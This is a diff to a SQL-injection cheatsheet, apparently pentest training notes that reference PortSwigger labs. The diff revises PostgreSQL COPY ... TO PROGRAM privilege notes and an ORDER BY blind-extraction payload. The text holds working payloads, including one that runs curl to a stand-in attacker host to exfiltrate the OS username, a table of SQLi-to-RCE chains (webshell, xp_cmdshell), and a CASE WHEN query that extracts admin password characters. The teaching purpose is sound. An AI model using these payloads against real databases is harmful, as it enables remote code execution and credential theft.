@@ -100,7 +100,7 @@ Breakdown:
 - The second `RECONFIGURE` applies that change. This entire chain requires `sysadmin`
   privileges on the SQL Server instance — confirm via `--is-dba` (file 07) before attempting.
 
-### 2.4 PostgreSQL — `COPY ... TO/FROM PROGRAM` (Requires Superuser)
+### 2.4 PostgreSQL — `COPY ... TO/FROM PROGRAM` (Requires Superuser, or `pg_execute_server_program`)
 
 ```sql
 '; COPY (SELECT '') TO PROGRAM 'curl http://attacker-collab.net/$(whoami)'--
@@ -113,8 +113,9 @@ Breakdown:
   that *outer* shell (command substitution) before curl even runs, so the resulting outbound
   request carries the OS username as part of the URL, both demonstrating RCE and exfiltrating
   data via OOB simultaneously (ties together files 04 and 08).
-- Requires Postgres superuser privileges — far less commonly available on application-tier
-  DB accounts than MSSQL's `sysadmin`/MySQL's `FILE` privilege equivalents.
+- Requires Postgres superuser privileges on most deployments — on PostgreSQL 11+, a non-superuser
+  role explicitly granted the `pg_execute_server_program` role can also use this, so don't
+  rule the primitive out purely from a non-superuser connection without checking role grants.
 
 ## 3. SQLi-to-RCE Chain Summary
 
@@ -122,7 +123,7 @@ Breakdown:
 |---|---|---|---|
 | MySQL | `INTO OUTFILE` + reachable webroot | `FILE` priv, writable webroot | Write webshell → HTTP request → RCE |
 | MSSQL | `xp_cmdshell` | `sysadmin` (or pre-enabled) | Direct command execution, no file write needed |
-| PostgreSQL | `COPY ... TO PROGRAM` | Superuser | Direct command execution via OS pipe |
+| PostgreSQL | `COPY ... TO PROGRAM` | Superuser (or `pg_execute_server_program` role) | Direct command execution via OS pipe |
 | Oracle | Java stored procedures / `DBMS_SCHEDULER` | Elevated package grants | More involved — typically requires chaining a Java-in-DB stored procedure deployment, out of scope for a quick payload but worth flagging as a finding-impact note |
 
 ## 4. Authentication Bypass Cheatsheet
@@ -170,19 +171,25 @@ PortSwigger lab mapping (Apprentice): **"SQL injection vulnerability allowing lo
 ### 5.1 `ORDER BY` Clause Injection
 
 ```sql
-?sort=name' OR (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')='a
+?sort=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE id END)
 ```
 
 Breakdown:
 - `ORDER BY` contexts can't use the same `UNION`/comment-out tricks cleanly in every case,
-  since they sit at the very end of the query, after the `WHERE` clause — note the absence of
-  a `--` here; this payload is structured to keep the *entire remaining original query*
-  syntactically valid rather than commenting it out, since there's nothing meaningful left
-  after `ORDER BY` to comment away.
-- Boolean conditions work the same way as file 03, but the *signal* is the sort order itself
-  changing (or erroring) rather than content appearing/disappearing — a true condition might
-  alphabetically reorder results differently than a false one in some implementations, so test
-  carefully and confirm signal reliability before automating extraction here.
+  since they sit at the very end of the query, after the `WHERE` clause — there's nothing
+  meaningful left after `ORDER BY` to comment away, so payloads here have to keep the rest of
+  the query syntactically valid rather than terminating it.
+- A bare tautology like `' OR (subquery)='a'` appended after a column name does **not** work
+  here: operator precedence collapses `'name' OR (subquery)='a'` into a single constant
+  boolean value for every row, so the sort order never actually changes regardless of whether
+  the subquery is true or false — it looks like a working boolean-blind payload but produces
+  no usable signal.
+- The `CASE WHEN ... THEN col1 ELSE col2 END` form above is the correct boolean-blind
+  mechanism for this context: it makes the *column actually used to sort* depend on the
+  condition's truth value, so a true condition sorts by `name` and a false one sorts by `id` —
+  the two produce visibly different row orderings, which is the actual detectable signal.
+  Confirm signal reliability (i.e., that `name`- and `id`-ordering genuinely differ in the
+  test data) before automating extraction with this technique.
 - Time-based is generally the more reliable technique in `ORDER BY` contexts specifically,
   since it doesn't depend on interpreting subtle sort-order differences:
 
